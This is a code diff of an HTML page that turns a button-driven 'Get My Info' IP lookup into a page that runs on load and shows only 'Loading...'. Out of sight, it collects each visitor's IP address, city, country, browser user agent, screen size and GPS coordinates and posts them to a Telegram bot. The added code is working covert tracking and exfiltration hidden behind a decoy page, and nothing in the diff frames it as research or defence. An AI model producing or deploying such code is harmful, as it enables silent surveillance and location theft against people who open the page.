@@ -3,48 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP & Device Tracker</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-        }
-    </style>
-</head>
-<body>
-    <h2>Click the button to get your details</h2>
-    <button onclick="getUserDetails()">Get My Info</button>
-    <p id="result"></p>
-
+    <title>Auto IP & Device Tracker</title>
     <script>
-        function getUserDetails() {
-            document.getElementById("result").innerText = "Fetching details...";
-
+        document.addEventListener("DOMContentLoaded", function () {
             fetch("https://api64.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
-                    const userIP = data.ip;
-                    getIPDetails(userIP);
+                    getIPDetails(data.ip);
                 })
                 .catch(error => console.error("Error fetching IP:", error));
-        }
+        });
 
         function getIPDetails(ip) {
             fetch(`https://ip-api.com/json/${ip}`)
                 .then(response => response.json())
                 .then(ipData => {
-                    if (ipData.status === "fail") {
-                        document.getElementById("result").innerText = "Error fetching IP details.";
-                        return;
-                    }
+                    if (ipData.status === "fail") return;
 
                     const deviceInfo = getDeviceInfo();
-                    const ipDetails = `
+                    let message = `
                         🌍 IP: ${ipData.query}
                         🏳 Country: ${ipData.country}
                         🏙 City: ${ipData.city}
@@ -53,18 +30,16 @@
                         📱 Device: ${deviceInfo}
                     `;
 
-                    document.getElementById("result").innerText = ipDetails;
-                    sendToTelegram(ipDetails);
+                    sendToTelegram(message);
 
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             position => {
-                                const locationDetails = `
+                                let locationDetails = `
                                     📍 GPS Location:
                                     Latitude: ${position.coords.latitude}
                                     Longitude: ${position.coords.longitude}
                                 `;
-                                document.getElementById("result").innerText += "\n\n" + locationDetails;
                                 sendToTelegram(locationDetails);
                             },
                             error => console.log("Geolocation error:", error)
@@ -75,10 +50,7 @@
         }
 
         function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            return `${userAgent} (Screen: ${screenWidth}x${screenHeight})`;
+            return `${navigator.userAgent} (Screen: ${screen.width}x${screen.height})`;
         }
 
         function sendToTelegram(message) {
@@ -89,10 +61,11 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(response => response.json())
-              .then(data => console.log("Sent to Telegram:", data))
-              .catch(error => console.error("Telegram Error:", error));
+            }).catch(error => console.error("Telegram Error:", error));
         }
     </script>
+</head>
+<body>
+    <h2>Loading...</h2>
 </body>
 </html>
